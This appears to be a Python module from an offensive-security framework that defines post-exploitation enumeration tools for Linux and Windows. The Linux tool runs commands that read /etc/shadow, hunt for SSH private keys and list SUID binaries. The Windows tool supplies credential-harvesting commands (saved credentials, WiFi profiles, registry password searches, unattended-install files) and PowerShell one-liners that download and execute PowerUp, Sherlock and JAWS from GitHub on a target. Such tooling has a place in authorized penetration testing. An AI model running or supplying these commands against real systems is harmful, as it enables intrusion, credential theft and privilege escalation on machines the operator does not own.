#!/usr/bin/env python3
"""
后渗透枚举工具集
"""

import subprocess
import logging
import os
from typing import Any, Dict, List
from dataclasses import dataclass, field

from core.tool_registry import BaseTool, ToolCategory, ToolParameter

logger = logging.getLogger(__name__)


@dataclass
class LinEnumTool(BaseTool):
    """Linux系统枚举"""
    name: str = "linenum"
    description: str = "LinEnum - Linux本地枚举脚本"
    category: ToolCategory = ToolCategory.POST_EXPLOIT
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("thorough", "boolean", "彻底检查", required=False, default=False),
        ToolParameter("output_file", "string", "输出文件", required=False, default=""),
    ])
    timeout: int = 300
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        thorough = params.get("thorough", False)
        output_file = params.get("output_file", "")
        
        # 查找LinEnum脚本
        script_paths = [
            "/usr/share/linenum/LinEnum.sh",
            "/opt/LinEnum/LinEnum.sh",
            "./LinEnum.sh"
        ]
        
        script_path = None
        for path in script_paths:
            if os.path.exists(path):
                script_path = path
                break
        
        if not script_path:
            # 生成内联枚举命令
            return self._inline_enum()
        
        cmd = ["bash", script_path]
        if thorough:
            cmd.append("-t")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )
            
            if output_file:
                with open(output_file, 'w') as f:
                    f.write(result.stdout)
            
            return {
                "success": True,
                "output": result.stdout[:10000],  # 限制输出
                "output_file": output_file if output_file else None
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _inline_enum(self) -> Dict[str, Any]:
        """内联枚举命令"""
        enum_commands = {
            "system_info": [
                "uname -a",
                "cat /etc/os-release",
                "cat /proc/version"
            ],
            "users": [
                "cat /etc/passwd",
                "cat /etc/shadow 2>/dev/null",
                "cat /etc/group",
                "whoami",
                "id",
                "who",
                "w"
            ],
            "network": [
                "ip a",
                "ip route",
                "ss -tunlp",
                "netstat -tunlp 2>/dev/null",
                "cat /etc/hosts"
            ],
            "processes": [
                "ps aux",
                "ps -ef"
            ],
            "suid_sgid": [
                "find / -perm -4000 -type f 2>/dev/null",
                "find / -perm -2000 -type f 2>/dev/null"
            ],
            "writable_dirs": [
                "find / -writable -type d 2>/dev/null | head -20"
            ],
            "cron": [
                "cat /etc/crontab",
                "ls -la /etc/cron.*",
                "crontab -l 2>/dev/null"
            ],
            "interesting_files": [
                "ls -la /home/",
                "ls -la /root/ 2>/dev/null",
                "find / -name '*.conf' -type f 2>/dev/null | head -20",
                "find / -name 'id_rsa*' 2>/dev/null"
            ]
        }
        
        results = {}
        for category, commands in enum_commands.items():
            results[category] = []
            for cmd in commands:
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    if result.stdout.strip():
                        results[category].append({
                            "command": cmd,
                            "output": result.stdout[:2000]  # 限制输出
                        })
                except:
                    pass
        
        return {
            "success": True,
            "mode": "inline",
            "results": results,
            "note": "LinEnum脚本未找到，使用内联枚举命令"
        }


@dataclass
class WindowsEnumTool(BaseTool):
    """Windows系统枚举"""
    name: str = "windows_enum"
    description: str = "Windows枚举 - 生成Windows本地枚举命令"
    category: ToolCategory = ToolCategory.POST_EXPLOIT
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("category", "string", "枚举类别", required=False, default="all",
                     choices=["all", "system", "users", "network", "processes", 
                             "services", "registry", "credentials"]),
    ])
    timeout: int = 10
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        category = params.get("category", "all")
        
        # Windows枚举命令集合
        enum_commands = {
            "system": {
                "系统信息": "systeminfo",
                "主机名": "hostname",
                "系统架构": "echo %PROCESSOR_ARCHITECTURE%",
                "环境变量": "set",
                "补丁信息": "wmic qfe get Caption,Description,HotFixID,InstalledOn"
            },
            "users": {
                "当前用户": "whoami",
                "用户权限": "whoami /priv",
                "用户组": "whoami /groups",
                "本地用户": "net user",
                "本地管理员": "net localgroup administrators",
                "域信息": "net user /domain 2>nul"
            },
            "network": {
                "IP配置": "ipconfig /all",
                "路由表": "route print",
                "ARP表": "arp -a",
                "网络连接": "netstat -ano",
                "防火墙状态": "netsh firewall show state",
                "共享": "net share"
            },
            "processes": {
                "进程列表": "tasklist /v",
                "服务进程": "tasklist /svc",
                "进程树": "wmic process get Caption,ParentProcessId,ProcessId"
            },
            "services": {
                "服务列表": "sc query",
                "运行中服务": "net start",
                "服务配置": "wmic service get name,startname,pathname"
            },
            "registry": {
                "自动运行": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "已安装软件": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s",
                "AlwaysInstallElevated": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"
            },
            "credentials": {
                "凭据管理器": "cmdkey /list",
                "保存的WiFi密码": "netsh wlan show profiles",
                "注册表凭证": "reg query HKLM /f password /t REG_SZ /s 2>nul | head -20",
                "Unattended安装文件": [
                    "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
                    "type C:\\Windows\\Panther\\Unattended.xml 2>nul",
                    "type C:\\Windows\\sysprep\\sysprep.xml 2>nul"
                ]
            }
        }
        
        if category == "all":
            commands_to_return = enum_commands
        else:
            commands_to_return = {category: enum_commands.get(category, {})}
        
        return {
            "success": True,
            "category": category,
            "commands": commands_to_return,
            "usage_note": "在目标Windows系统上执行这些命令进行本地枚举",
            "scripts": {
                "PowerUp": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks",
                "Sherlock": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns",
                "JAWS": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1')"
            }
        }
